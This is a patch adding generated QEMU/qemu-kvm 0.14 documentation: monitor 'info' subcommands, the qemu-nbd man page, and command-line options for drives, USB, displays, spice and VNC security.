+invalid. @var{expire-time} accepts:
+
+@table @var
+@item now
+Invalidate password instantly.
+
+@item never
+Password stays valid forever.
+
+@item +nsec
+Password stays valid for @var{nsec} seconds starting now.
+
+@item nsec
+Password is invalidated at the given time.  @var{nsec} are the seconds
+passed since 1970, i.e. unix epoch.
+
+@end table
+@item info @var{subcommand}
+@findex info
+Show various information about the system state.
+
+@table @option
+@item info version
+show the version of QEMU
+@item info network
+show the various VLANs and the associated devices
+@item info chardev
+show the character devices
+@item info block
+show the block devices
+@item info blockstats
+show block device statistics
+@item info registers
+show the cpu registers
+@item info cpus
+show infos for each CPU
+@item info history
+show the command line history
+@item info irq
+show the interrupts statistics (if available)
+@item info pic
+show i8259 (PIC) state
+@item info pci
+show emulated PCI device info
+@item info tlb
+show virtual to physical memory mappings (i386, SH4 and SPARC only)
+@item info mem
+show the active virtual memory mappings (i386 only)
+@item info jit
+show dynamic compiler info
+@item info kvm
+show KVM information
+@item info numa
+show NUMA information
+@item info kvm
+show KVM information
+@item info usb
+show USB devices plugged on the virtual USB hub
+@item info usbhost
+show all USB host devices
+@item info profile
+show profiling information
+@item info capture
+show information about active capturing
+@item info snapshots
+show list of VM snapshots
+@item info status
+show the current VM status (running|paused)
+@item info pcmcia
+show guest PCMCIA status
+@item info mice
+show which guest mouse is receiving events
+@item info vnc
+show the vnc server status
+@item info name
+show the current VM name
+@item info uuid
+show the current VM UUID
+@item info cpustats
+show CPU statistics
+@item info usernet
+show user network stack connection states
+@item info migrate
+show migration status
+@item info balloon
+show balloon information
+@item info qtree
+show device tree
+@item info qdm
+show qdev device model list
+@item info roms
+show roms
+@end table
+@item info trace
+show contents of trace buffer
+@item info trace-events
+show available trace events and their state
+@end table
diff -Nurp qemu-kvm-0.14.0+noroms.orig/qemu-nbd.8 qemu-kvm-0.14.0+noroms/qemu-nbd.8
--- qemu-kvm-0.14.0+noroms.orig/qemu-nbd.8	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/qemu-nbd.8	2014-02-19 10:12:19.000000000 -0500
@@ -0,0 +1,229 @@
+.\" Automatically generated by Pod::Man 2.23 (Pod::Simple 3.14)
+.\"
+.\" Standard preamble:
+.\" ========================================================================
+.de Sp \" Vertical space (when we can't use .PP)
+.if t .sp .5v
+.if n .sp
+..
+.de Vb \" Begin verbatim text
+.ft CW
+.nf
+.ne \\$1
+..
+.de Ve \" End verbatim text
+.ft R
+.fi
+..
+.\" Set up some character translations and predefined strings.  \*(-- will
+.\" give an unbreakable dash, \*(PI will give pi, \*(L" will give a left
+.\" double quote, and \*(R" will give a right double quote.  \*(C+ will
+.\" give a nicer C++.  Capital omega is used to do unbreakable dashes and
+.\" therefore won't be available.  \*(C` and \*(C' expand to `' in nroff,
+.\" nothing in troff, for use with C<>.
+.tr \(*W-
+.ds C+ C\v'-.1v'\h'-1p'\s-2+\h'-1p'+\s0\v'.1v'\h'-1p'
+.ie n \{\
+.    ds -- \(*W-
+.    ds PI pi
+.    if (\n(.H=4u)&(1m=24u) .ds -- \(*W\h'-12u'\(*W\h'-12u'-\" diablo 10 pitch
+.    if (\n(.H=4u)&(1m=20u) .ds -- \(*W\h'-12u'\(*W\h'-8u'-\"  diablo 12 pitch
+.    ds L" ""
+.    ds R" ""
+.    ds C` ""
+.    ds C' ""
+'br\}
+.el\{\
+.    ds -- \|\(em\|
+.    ds PI \(*p
+.    ds L" ``
+.    ds R" ''
+'br\}
+.\"
+.\" Escape single quotes in literal strings from groff's Unicode transform.
+.ie \n(.g .ds Aq \(aq
+.el       .ds Aq '
+.\"
+.\" If the F register is turned on, we'll generate index entries on stderr for
+.\" titles (.TH), headers (.SH), subsections (.SS), items (.Ip), and index
+.\" entries marked with X<> in POD.  Of course, you'll have to process the
+.\" output yourself in some meaningful fashion.
+.ie \nF \{\
+.    de IX
+.    tm Index:\\$1\t\\n%\t"\\$2"
+..
+.    nr % 0
+.    rr F
+.\}
+.el \{\
+.    de IX
+..
+.\}
+.\"
+.\" Accent mark definitions (@(#)ms.acc 1.5 88/02/08 SMI; from UCB 4.2).
+.\" Fear.  Run.  Save yourself.  No user-serviceable parts.
+.    \" fudge factors for nroff and troff
+.if n \{\
+.    ds #H 0
+.    ds #V .8m
+.    ds #F .3m
+.    ds #[ \f1
+.    ds #] \fP
+.\}
+.if t \{\
+.    ds #H ((1u-(\\\\n(.fu%2u))*.13m)
+.    ds #V .6m
+.    ds #F 0
+.    ds #[ \&
+.    ds #] \&
+.\}
+.    \" simple accents for nroff and troff
+.if n \{\
+.    ds ' \&
+.    ds ` \&
+.    ds ^ \&
+.    ds , \&
+.    ds ~ ~
+.    ds /
+.\}
+.if t \{\
+.    ds ' \\k:\h'-(\\n(.wu*8/10-\*(#H)'\'\h"|\\n:u"
+.    ds ` \\k:\h'-(\\n(.wu*8/10-\*(#H)'\`\h'|\\n:u'
+.    ds ^ \\k:\h'-(\\n(.wu*10/11-\*(#H)'^\h'|\\n:u'
+.    ds , \\k:\h'-(\\n(.wu*8/10)',\h'|\\n:u'
+.    ds ~ \\k:\h'-(\\n(.wu-\*(#H-.1m)'~\h'|\\n:u'
+.    ds / \\k:\h'-(\\n(.wu*8/10-\*(#H)'\z\(sl\h'|\\n:u'
+.\}
+.    \" troff and (daisy-wheel) nroff accents
+.ds : \\k:\h'-(\\n(.wu*8/10-\*(#H+.1m+\*(#F)'\v'-\*(#V'\z.\h'.2m+\*(#F'.\h'|\\n:u'\v'\*(#V'
+.ds 8 \h'\*(#H'\(*b\h'-\*(#H'
+.ds o \\k:\h'-(\\n(.wu+\w'\(de'u-\*(#H)/2u'\v'-.3n'\*(#[\z\(de\v'.3n'\h'|\\n:u'\*(#]
+.ds d- \h'\*(#H'\(pd\h'-\w'~'u'\v'-.25m'\f2\(hy\fP\v'.25m'\h'-\*(#H'
+.ds D- D\\k:\h'-\w'D'u'\v'-.11m'\z\(hy\v'.11m'\h'|\\n:u'
+.ds th \*(#[\v'.3m'\s+1I\s-1\v'-.3m'\h'-(\w'I'u*2/3)'\s-1o\s+1\*(#]
+.ds Th \*(#[\s+2I\s-2\h'-\w'I'u*3/5'\v'-.3m'o\v'.3m'\*(#]
+.ds ae a\h'-(\w'a'u*4/10)'e
+.ds Ae A\h'-(\w'A'u*4/10)'E
+.    \" corrections for vroff
+.if v .ds ~ \\k:\h'-(\\n(.wu*9/10-\*(#H)'\s-2\u~\d\s+2\h'|\\n:u'
+.if v .ds ^ \\k:\h'-(\\n(.wu*10/11-\*(#H)'\v'-.4m'^\v'.4m'\h'|\\n:u'
+.    \" for low resolution devices (crt and lpr)
+.if \n(.H>23 .if \n(.V>19 \
+\{\
+.    ds : e
+.    ds 8 ss
+.    ds o a
+.    ds d- d\h'-1'\(ga
+.    ds D- D\h'-1'\(hy
+.    ds th \o'bp'
+.    ds Th \o'LP'
+.    ds ae ae
+.    ds Ae AE
+.\}
+.rm #[ #] #H #V #F C
+.\" ========================================================================
+.\"
+.IX Title "QEMU-NBD 8"
+.TH QEMU-NBD 8 "2013-08-03" " " " "
+.\" For nroff, turn off justification.  Always turn off hyphenation; it makes
+.\" way too many mistakes in technical documents.
+.if n .ad l
+.nh
+.SH "NAME"
+qemu\-nbd \- QEMU Disk Network Block Device Server
+.SH "SYNOPSIS"
+.IX Header "SYNOPSIS"
+usage: qemu-nbd [\s-1OPTION\s0]...  \fIfilename\fR
+.SH "DESCRIPTION"
+.IX Header "DESCRIPTION"
+Export Qemu disk image using \s-1NBD\s0 protocol.
+.SH "OPTIONS"
+.IX Header "OPTIONS"
+.IP "\fIfilename\fR" 4
+.IX Item "filename"
+.Vb 1
+\& is a disk image filename
+.Ve
+.IP "\fB\-p, \-\-port=\fR\fIport\fR" 4
+.IX Item "-p, --port=port"
+.Vb 1
+\&  port to listen on (default B<1024>)
+.Ve
+.IP "\fB\-o, \-\-offset=\fR\fIoffset\fR" 4
+.IX Item "-o, --offset=offset"
+.Vb 1
+\&  offset into the image
+.Ve
+.IP "\fB\-b, \-\-bind=\fR\fIiface\fR" 4
+.IX Item "-b, --bind=iface"
+.Vb 1
+\&  interface to bind to (default B<0.0.0.0>)
+.Ve
+.IP "\fB\-k, \-\-socket=\fR\fIpath\fR" 4
+.IX Item "-k, --socket=path"
+.Vb 1
+\&  Use a unix socket with path I<path>
+.Ve
+.IP "\fB\-r, \-\-read\-only\fR" 4
+.IX Item "-r, --read-only"
+.Vb 1
+\&  export read\-only
+.Ve
+.IP "\fB\-P, \-\-partition=\fR\fInum\fR" 4
+.IX Item "-P, --partition=num"
+.Vb 1
+\&  only expose partition I<num>
+.Ve
+.IP "\fB\-s, \-\-snapshot\fR" 4
+.IX Item "-s, --snapshot"
+.Vb 1
+\&  use snapshot file
+.Ve
+.IP "\fB\-n, \-\-nocache\fR" 4
+.IX Item "-n, --nocache"
+.Vb 1
+\&  disable host cache
+.Ve
+.IP "\fB\-c, \-\-connect=\fR\fIdev\fR" 4
+.IX Item "-c, --connect=dev"
+.Vb 1
+\&  connect I<filename> to NBD device I<dev>
+.Ve
+.IP "\fB\-d, \-\-disconnect\fR" 4
+.IX Item "-d, --disconnect"
+.Vb 1
+\&  disconnect the specified device
+.Ve
+.IP "\fB\-e, \-\-shared=\fR\fInum\fR" 4
+.IX Item "-e, --shared=num"
+.Vb 1
+\&  device can be shared by I<num> clients (default B<1>)
+.Ve
+.IP "\fB\-t, \-\-persistent\fR" 4
+.IX Item "-t, --persistent"
+.Vb 1
+\&  don\*(Aqt exit on the last connection
+.Ve
+.IP "\fB\-v, \-\-verbose\fR" 4
+.IX Item "-v, --verbose"
+.Vb 1
+\&  display extra debugging information
+.Ve
+.IP "\fB\-h, \-\-help\fR" 4
+.IX Item "-h, --help"
+.Vb 1
+\&  display this help and exit
+.Ve
+.IP "\fB\-V, \-\-version\fR" 4
+.IX Item "-V, --version"
+.Vb 1
+\&  output version information and exit
+.Ve
+.SH "SEE ALSO"
+.IX Header "SEE ALSO"
+\&\fIqemu\-img\fR\|(1)
+.SH "AUTHOR"
+.IX Header "AUTHOR"
+Copyright (C) 2006 Anthony Liguori <anthony@codemonkey.ws>.
+This is free software; see the source for copying conditions.  There is \s-1NO\s0
+warranty; not even for \s-1MERCHANTABILITY\s0 or \s-1FITNESS\s0 \s-1FOR\s0 A \s-1PARTICULAR\s0 \s-1PURPOSE\s0.
diff -Nurp qemu-kvm-0.14.0+noroms.orig/qemu-options.texi qemu-kvm-0.14.0+noroms/qemu-options.texi
--- qemu-kvm-0.14.0+noroms.orig/qemu-options.texi	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/qemu-options.texi	2014-02-19 10:12:23.000000000 -0500
@@ -0,0 +1,1556 @@
+Standard options:
+@table @option
+@item -h
+@findex -h
+Display help and exit
+@item -version
+@findex -version
+Display version information and exit
+@item -M @var{machine}
+@findex -M
+Select the emulated @var{machine} (@code{-M ?} for list)
+@item -cpu @var{model}
+@findex -cpu
+Select CPU model (-cpu ? for list and additional feature selection)
+@item -smp @var{n}[,cores=@var{cores}][,threads=@var{threads}][,sockets=@var{sockets}][,maxcpus=@var{maxcpus}]
+@findex -smp
+Simulate an SMP system with @var{n} CPUs. On the PC target, up to 255
+CPUs are supported. On Sparc32 target, Linux limits the number of usable CPUs
+to 4.
+For the PC target, the number of @var{cores} per socket, the number
+of @var{threads} per cores and the total number of @var{sockets} can be
+specified. Missing values will be computed. If any on the three values is
+given, the total number of CPUs @var{n} can be omitted. @var{maxcpus}
+specifies the maximum number of hotpluggable CPUs.
+@item -numa @var{opts}
+@findex -numa
+Simulate a multi node NUMA system. If mem and cpus are omitted, resources
+are split equally.
+@item -fda @var{file}
+@item -fdb @var{file}
+@findex -fda
+@findex -fdb
+Use @var{file} as floppy disk 0/1 image (@pxref{disk_images}). You can
+use the host floppy by using @file{/dev/fd0} as filename (@pxref{host_drives}).
+@item -hda @var{file}
+@item -hdb @var{file}
+@item -hdc @var{file}
+@item -hdd @var{file}
+@findex -hda
+@findex -hdb
+@findex -hdc
+@findex -hdd
+Use @var{file} as hard disk 0, 1, 2 or 3 image (@pxref{disk_images}).
+@item -cdrom @var{file}
+@findex -cdrom
+Use @var{file} as CD-ROM image (you cannot use @option{-hdc} and
+@option{-cdrom} at the same time). You can use the host CD-ROM by
+using @file{/dev/cdrom} as filename (@pxref{host_drives}).
+@item -drive @var{option}[,@var{option}[,@var{option}[,...]]]
+@findex -drive
+
+Define a new drive. Valid options are:
+
+@table @option
+@item file=@var{file}
+This option defines which disk image (@pxref{disk_images}) to use with
+this drive. If the filename contains comma, you must double it
+(for instance, "file=my,,file" to use file "my,file").
+@item if=@var{interface}
+This option defines on which type on interface the drive is connected.
+Available types are: ide, scsi, sd, mtd, floppy, pflash, virtio.
+@item bus=@var{bus},unit=@var{unit}
+These options define where is connected the drive by defining the bus number and
+the unit id.
+@item index=@var{index}
+This option defines where is connected the drive by using an index in the list
+of available connectors of a given interface type.
+@item media=@var{media}
+This option defines the type of the media: disk or cdrom.
+@item cyls=@var{c},heads=@var{h},secs=@var{s}[,trans=@var{t}]
+These options have the same definition as they have in @option{-hdachs}.
+@item snapshot=@var{snapshot}
+@var{snapshot} is "on" or "off" and allows to enable snapshot for given drive (see @option{-snapshot}).
+@item cache=@var{cache}
+@var{cache} is "none", "writeback", "unsafe", or "writethrough" and controls how the host cache is used to access block data.
+@item aio=@var{aio}
+@var{aio} is "threads", or "native" and selects between pthread based disk I/O and native Linux AIO.
+@item format=@var{format}
+Specify which disk @var{format} will be used rather than detecting
+the format.  Can be used to specifiy format=raw to avoid interpreting
+an untrusted format header.
+@item serial=@var{serial}
+This option specifies the serial number to assign to the device.
+@item addr=@var{addr}
+Specify the controller's PCI address (if=virtio only).
+@item boot=@var{boot}
+@var{boot} is "on" or "off" and allows for booting from non-traditional interfaces, such as virtio.
+@end table
+
+By default, writethrough caching is used for all block device.  This means that
+the host page cache will be used to read and write data but write notification
+will be sent to the guest only when the data has been reported as written by
+the storage subsystem.
+
+Writeback caching will report data writes as completed as soon as the data is
+present in the host page cache.  This is safe as long as you trust your host.
+If your host crashes or loses power, then the guest may experience data
+corruption.
+
+The host page cache can be avoided entirely with @option{cache=none}.  This will
+attempt to do disk IO directly to the guests memory.  QEMU may still perform
+an internal copy of the data.
+
+Some block drivers perform badly with @option{cache=writethrough}, most notably,
+qcow2.  If performance is more important than correctness,
+@option{cache=writeback} should be used with qcow2.
+
+In case you don't care about data integrity over host failures, use
+cache=unsafe. This option tells qemu that it never needs to write any data
+to the disk but can instead keeps things in cache. If anything goes wrong,
+like your host losing power, the disk storage getting disconnected accidently,
+etc. you're image will most probably be rendered unusable.   When using
+the @option{-snapshot} option, unsafe caching is always used.
+
+Instead of @option{-cdrom} you can use:
+@example
+qemu -drive file=file,index=2,media=cdrom
+@end example
+
+Instead of @option{-hda}, @option{-hdb}, @option{-hdc}, @option{-hdd}, you can
+use:
+@example
+qemu -drive file=file,index=0,media=disk
+qemu -drive file=file,index=1,media=disk
+qemu -drive file=file,index=2,media=disk
+qemu -drive file=file,index=3,media=disk
+@end example
+
+You can connect a CDROM to the slave of ide0:
+@example
+qemu -drive file=file,if=ide,index=1,media=cdrom
+@end example
+
+If you don't specify the "file=" argument, you define an empty drive:
+@example
+qemu -drive if=ide,index=1,media=cdrom
+@end example
+
+You can connect a SCSI disk with unit ID 6 on the bus #0:
+@example
+qemu -drive file=file,if=scsi,bus=0,unit=6
+@end example
+
+Instead of @option{-fda}, @option{-fdb}, you can use:
+@example
+qemu -drive file=file,index=0,if=floppy
+qemu -drive file=file,index=1,if=floppy
+@end example
+
+By default, @var{interface} is "ide" and @var{index} is automatically
+incremented:
+@example
+qemu -drive file=a -drive file=b"
+@end example
+is interpreted like:
+@example
+qemu -hda a -hdb b
+@end example
+@item -set
+@findex -set
+TODO
+@item -global
+@findex -global
+TODO
+@item -mtdblock @var{file}
+@findex -mtdblock
+Use @var{file} as on-board Flash memory image.
+@item -sd @var{file}
+@findex -sd
+Use @var{file} as SecureDigital card image.
+@item -pflash @var{file}
+@findex -pflash
+Use @var{file} as a parallel flash image.
+@item -boot [order=@var{drives}][,once=@var{drives}][,menu=on|off]
+@findex -boot
+Specify boot order @var{drives} as a string of drive letters. Valid
+drive letters depend on the target achitecture. The x86 PC uses: a, b
+(floppy 1 and 2), c (first hard disk), d (first CD-ROM), n-p (Etherboot
+from network adapter 1-4), hard disk boot is the default. To apply a
+particular boot order only on the first startup, specify it via
+@option{once}.
+
+Interactive boot menus/prompts can be enabled via @option{menu=on} as far
+as firmware/BIOS supports them. The default is non-interactive boot.
+
+@example
+# try to boot from network first, then from hard disk
+qemu -boot order=nc
+# boot from CD-ROM first, switch back to default order after reboot
+qemu -boot once=d
+@end example
+
+Note: The legacy format '-boot @var{drives}' is still supported but its
+use is discouraged as it may be removed from future versions.
+@item -snapshot
+@findex -snapshot
+Write to temporary files instead of disk image files. In this case,
+the raw disk image you use is not written back. You can however force
+the write back by pressing @key{C-a s} (@pxref{disk_images}).
+@item -m @var{megs}
+@findex -m
+Set virtual RAM size to @var{megs} megabytes. Default is 128 MiB.  Optionally,
+a suffix of ``M'' or ``G'' can be used to signify a value in megabytes or
+gigabytes respectively.
+@item -mem-path @var{path}
+Allocate guest RAM from a temporarily created file in @var{path}.
+@item -mem-prealloc
+Preallocate memory when using -mem-path.
+@item -k @var{language}
+@findex -k
+Use keyboard layout @var{language} (for example @code{fr} for
+French). This option is only needed where it is not easy to get raw PC
+keycodes (e.g. on Macs, with some X11 servers or with a VNC
+display). You don't normally need to use it on PC/Linux or PC/Windows
+hosts.
+
+The available layouts are:
+@example
+ar  de-ch  es  fo     fr-ca  hu  ja  mk     no  pt-br  sv
+da  en-gb  et  fr     fr-ch  is  lt  nl     pl  ru     th
+de  en-us  fi  fr-be  hr     it  lv  nl-be  pt  sl     tr
+@end example
+
+The default is @code{en-us}.
+@item -audio-help
+@findex -audio-help
+Will show the audio subsystem help: list of drivers, tunable
+parameters.
+@item -soundhw @var{card1}[,@var{card2},...] or -soundhw all
+@findex -soundhw
+Enable audio and selected sound hardware. Use ? to print all
+available sound hardware.
+
+@example
+qemu -soundhw sb16,adlib disk.img
+qemu -soundhw es1370 disk.img
+qemu -soundhw ac97 disk.img
+qemu -soundhw hda disk.img
+qemu -soundhw all disk.img
+qemu -soundhw ?
+@end example
+
+Note that Linux's i810_audio OSS kernel (for AC97) module might
+require manually specifying clocking.
+
+@example
+modprobe i810_audio clocking=48000
+@end example
+@end table
+USB options:
+@table @option
+
+@item -usb
+@findex -usb
+Enable the USB driver (will be the default soon)
+
+@item -usbdevice @var{devname}
+@findex -usbdevice
+Add the USB device @var{devname}. @xref{usb_devices}.
+
+@table @option
+
+@item mouse
+Virtual Mouse. This will override the PS/2 mouse emulation when activated.
+
+@item tablet
+Pointer device that uses absolute coordinates (like a touchscreen). This
+means qemu is able to report the mouse position without having to grab the
+mouse. Also overrides the PS/2 mouse emulation when activated.
+
+@item disk:[format=@var{format}]:@var{file}
+Mass storage device based on file. The optional @var{format} argument
+will be used rather than detecting the format. Can be used to specifiy
+@code{format=raw} to avoid interpreting an untrusted format header.
+
+@item host:@var{bus}.@var{addr}
+Pass through the host device identified by @var{bus}.@var{addr} (Linux only).
+
+@item host:@var{vendor_id}:@var{product_id}
+Pass through the host device identified by @var{vendor_id}:@var{product_id}
+(Linux only).
+
+@item serial:[vendorid=@var{vendor_id}][,productid=@var{product_id}]:@var{dev}
+Serial converter to host character device @var{dev}, see @code{-serial} for the
+available devices.
+
+@item braille
+Braille device.  This will use BrlAPI to display the braille output on a real
+or fake device.
+
+@item net:@var{options}
+Network adapter that supports CDC ethernet and RNDIS protocols.
+
+@end table
+@item -device @var{driver}[,@var{prop}[=@var{value}][,...]]
+@findex -device
+Add device @var{driver}.  @var{prop}=@var{value} sets driver
+properties.  Valid properties depend on the driver.  To get help on
+possible drivers and properties, use @code{-device ?} and
+@code{-device @var{driver},?}.
+File system options:
+
+The general form of a File system device option is:
+@table @option
+
+@item -fsdev @var{fstype} ,id=@var{id} [,@var{options}]
+@findex -fsdev
+Fstype is one of:
+@option{local},
+The specific Fstype will determine the applicable options.
+
+Options to each backend are described below.
+
+@item -fsdev local ,id=@var{id} ,path=@var{path} ,security_model=@var{security_model}
+
+Create a file-system-"device" for local-filesystem.
+
+@option{local} is only available on Linux.
+
+@option{path} specifies the path to be exported. @option{path} is required.
+
+@option{security_model} specifies the security model to be followed.
+@option{security_model} is required.
+
+@end table
+Virtual File system pass-through options:
+
+The general form of a Virtual File system pass-through option is:
+@table @option
+
+@item -virtfs @var{fstype} [,@var{options}]
+@findex -virtfs
+Fstype is one of:
+@option{local},
+The specific Fstype will determine the applicable options.
+
+Options to each backend are described below.
+
+@item -virtfs local ,path=@var{path} ,mount_tag=@var{mount_tag} ,security_model=@var{security_model}
+
+Create a Virtual file-system-pass through for local-filesystem.
+
+@option{local} is only available on Linux.
+
+@option{path} specifies the path to be exported. @option{path} is required.
+
+@option{security_model} specifies the security model to be followed.
+@option{security_model} is required.
+
+
+@option{mount_tag} specifies the tag with which the exported file is mounted.
+@option{mount_tag} is required.
+
+@end table
+
+@item -name @var{name}
+@findex -name
+Sets the @var{name} of the guest.
+This name will be displayed in the SDL window caption.
+The @var{name} will also be used for the VNC server.
+Also optionally set the top visible process name in Linux.
+@item -uuid @var{uuid}
+@findex -uuid
+Set system UUID.
+@end table
+
+Display options:
+@table @option
+@item -nographic
+@findex -nographic
+Normally, QEMU uses SDL to display the VGA output. With this option,
+you can totally disable graphical output so that QEMU is a simple
+command line application. The emulated serial port is redirected on
+the console. Therefore, you can still use QEMU to debug a Linux kernel
+with a serial console.
+@item -curses
+@findex curses
+Normally, QEMU uses SDL to display the VGA output.  With this option,
+QEMU can display the VGA output when in text mode using a
+curses/ncurses interface.  Nothing is displayed in graphical mode.
+@item -no-frame
+@findex -no-frame
+Do not use decorations for SDL windows and start them using the whole
+available screen space. This makes the using QEMU in a dedicated desktop
+workspace more convenient.
+@item -alt-grab
+@findex -alt-grab
+Use Ctrl-Alt-Shift to grab mouse (instead of Ctrl-Alt).
+@item -ctrl-grab
+@findex -ctrl-grab
+Use Right-Ctrl to grab mouse (instead of Ctrl-Alt).
+@item -no-quit
+@findex -no-quit
+Disable SDL window close capability.
+@item -sdl
+@findex -sdl
+Enable SDL.
+@item -spice @var{option}[,@var{option}[,...]]
+@findex -spice
+Enable the spice remote desktop protocol. Valid options are
+
+@table @option
+
+@item port=<nr>
+Set the TCP port spice is listening on for plaintext channels.
+
+@item addr=<addr>
+Set the IP address spice is listening on.  Default is any address.
+
+@item ipv4
+@item ipv6
+Force using the specified IP version.
+
+@item password=<secret>
+Set the password you need to authenticate.
+
+@item disable-ticketing
+Allow client connects without authentication.
+
+@item tls-port=<nr>
+Set the TCP port spice is listening on for encrypted channels.
+
+@item x509-dir=<dir>
+Set the x509 file directory. Expects same filenames as -vnc $display,x509=$dir
+
+@item x509-key-file=<file>
+@item x509-key-password=<file>
+@item x509-cert-file=<file>
+@item x509-cacert-file=<file>
+@item x509-dh-key-file=<file>
+The x509 file names can also be configured individually.
+
+@item tls-ciphers=<list>
+Specify which ciphers to use.
+
+@item tls-channel=[main|display|inputs|record|playback|tunnel]
+@item plaintext-channel=[main|display|inputs|record|playback|tunnel]
+Force specific channel to be used with or without TLS encryption.  The
+options can be specified multiple times to configure multiple
+channels.  The special name "default" can be used to set the default
+mode.  For channels which are not explicitly forced into one mode the
+spice client is allowed to pick tls/plaintext as he pleases.
+
+@item image-compression=[auto_glz|auto_lz|quic|glz|lz|off]
+Configure image compression (lossless).
+Default is auto_glz.
+
+@item jpeg-wan-compression=[auto|never|always]
+@item zlib-glz-wan-compression=[auto|never|always]
+Configure wan image compression (lossy for slow links).
+Default is auto.
+
+@item streaming-video=[off|all|filter]
+Configure video stream detection.  Default is filter.
+
+@item agent-mouse=[on|off]
+Enable/disable passing mouse events via vdagent.  Default is on.
+
+@item playback-compression=[on|off]
+Enable/disable audio stream compression (using celt 0.5.1).  Default is on.
+
+@end table
+@item -portrait
+@findex -portrait
+Rotate graphical output 90 deg left (only PXA LCD).
+@item -vga @var{type}
+@findex -vga
+Select type of VGA card to emulate. Valid values for @var{type} are
+@table @option
+@item cirrus
+Cirrus Logic GD5446 Video card. All Windows versions starting from
+Windows 95 should recognize and use this graphic card. For optimal
+performances, use 16 bit color depth in the guest and the host OS.
+(This one is the default)
+@item std
+Standard VGA card with Bochs VBE extensions.  If your guest OS
+supports the VESA 2.0 VBE extensions (e.g. Windows XP) and if you want
+to use high resolution modes (>= 1280x1024x16) then you should use
+this option.
+@item vmware
+VMWare SVGA-II compatible adapter. Use it if you have sufficiently
+recent XFree86/XOrg server or Windows guest with a driver for this
+card.
+@item qxl
+QXL paravirtual graphic card.  It is VGA compatible (including VESA
+2.0 VBE support).  Works best with qxl guest drivers installed though.
+Recommended choice when using the spice protocol.
+@item none
+Disable VGA card.
+@end table
+@item -full-screen
+@findex -full-screen
+Start in full screen.
+@item -g @var{width}x@var{height}[x@var{depth}]
+@findex -g
+Set the initial graphical resolution and depth (PPC, SPARC only).
+@item -vnc @var{display}[,@var{option}[,@var{option}[,...]]]
+@findex -vnc
+Normally, QEMU uses SDL to display the VGA output.  With this option,
+you can have QEMU listen on VNC display @var{display} and redirect the VGA
+display over the VNC session.  It is very useful to enable the usb
+tablet device when using this option (option @option{-usbdevice
+tablet}). When using the VNC display, you must use the @option{-k}
+parameter to set the keyboard layout if you are not using en-us. Valid
+syntax for the @var{display} is
+
+@table @option
+
+@item @var{host}:@var{d}
+
+TCP connections will only be allowed from @var{host} on display @var{d}.
+By convention the TCP port is 5900+@var{d}. Optionally, @var{host} can
+be omitted in which case the server will accept connections from any host.
+
+@item unix:@var{path}
+
+Connections will be allowed over UNIX domain sockets where @var{path} is the
+location of a unix socket to listen for connections on.
+
+@item none
+
+VNC is initialized but not started. The monitor @code{change} command
+can be used to later start the VNC server.
+
+@end table
+
+Following the @var{display} value there may be one or more @var{option} flags
+separated by commas. Valid options are
+
+@table @option
+
+@item reverse
+
+Connect to a listening VNC client via a ``reverse'' connection. The
+client is specified by the @var{display}. For reverse network
+connections (@var{host}:@var{d},@code{reverse}), the @var{d} argument
+is a TCP port number, not a display number.
+
+@item password
+
+Require that password based authentication is used for client connections.
+The password must be set separately using the @code{change} command in the
+@ref{pcsys_monitor}
+
+@item tls
+
+Require that client use TLS when communicating with the VNC server. This
+uses anonymous TLS credentials so is susceptible to a man-in-the-middle
+attack. It is recommended that this option be combined with either the
+@option{x509} or @option{x509verify} options.
+
+@item x509=@var{/path/to/certificate/dir}
+
+Valid if @option{tls} is specified. Require that x509 credentials are used
+for negotiating the TLS session. The server will send its x509 certificate
+to the client. It is recommended that a password be set on the VNC server
+to provide authentication of the client when this is used. The path following
+this option specifies where the x509 certificates are to be loaded from.
+See the @ref{vnc_security} section for details on generating certificates.
+
+@item x509verify=@var{/path/to/certificate/dir}
+
+Valid if @option{tls} is specified. Require that x509 credentials are used
+for negotiating the TLS session. The server will send its x509 certificate
+to the client, and request that the client send its own x509 certificate.
+The server will validate the client's certificate against the CA certificate,
+and reject clients when validation fails. If the certificate authority is
+trusted, this is a sufficient authentication mechanism. You may still wish
+to set a password on the VNC server as a second authentication layer. The
+path following this option specifies where the x509 certificates are to
+be loaded from. See the @ref{vnc_security} section for details on generating
+certificates.
+
+@item sasl
+
+Require that the client use SASL to authenticate with the VNC server.
+The exact choice of authentication method used is controlled from the
+system / user's SASL configuration file for the 'qemu' service. This
+is typically found in /etc/sasl2/qemu.conf. If running QEMU as an
+unprivileged user, an environment variable SASL_CONF_PATH can be used
+to make it search alternate locations for the service config.
+While some SASL auth methods can also provide data encryption (eg GSSAPI),
+it is recommended that SASL always be combined with the 'tls' and
+'x509' settings to enable use of SSL and server certificates. This
+ensures a data encryption preventing compromise of authentication
+credentials. See the @ref{vnc_security} section for details on using
+SASL authentication.
+
+@item acl
+
+Turn on access control lists for checking of the x509 client certificate
+and SASL party. For x509 certs, the ACL check is made against the
+certificate's distinguished name. This is something that looks like
+@code{C=GB,O=ACME,L=Boston,CN=bob}. For SASL party, the ACL check is
+made against the username, which depending on the SASL plugin, may
+include a realm component, eg @code{bob} or @code{bob@@EXAMPLE.COM}.
+When the @option{acl} flag is set, the initial access list will be
+empty, with a @code{deny} policy. Thus no one will be allowed to
+use the VNC server until the ACLs have been loaded. This can be
+achieved using the @code{acl} monitor command.
+
+@item lossy
+
+Enable lossy compression methods (gradient, JPEG, ...). If this
+option is set, VNC client may receive lossy framebuffer updates
+depending on its encoding settings. Enabling this option can save
+a lot of bandwidth at the expense of quality.
+
+@end table
+@end table
+
+i386 target only:
+@table @option
+@item -win2k-hack
+@findex -win2k-hack
+Use it when installing Windows 2000 to avoid a disk full bug. After
+Windows 2000 is installed, you no longer need this option (this option
+slows down the IDE transfers).
+@item -no-fd-bootchk
+@findex -no-fd-bootchk
+Disable boot signature checking for floppy disks in Bochs BIOS. It may
+be needed to boot from old floppy disks.
+TODO: check reference to Bochs BIOS.
+@item -no-acpi
+@findex -no-acpi
+Disable ACPI (Advanced Configuration and Power Interface) support. Use
+it if your guest OS complains about ACPI problems (PC target machine
+only).
+@item -no-hpet
+@findex -no-hpet
+Disable HPET support.
+@item -balloon none
+@findex -balloon
+Disable balloon device.
+@item -balloon virtio[,addr=@var{addr}]
+Enable virtio balloon device (default), optionally with PCI address
+@var{addr}.
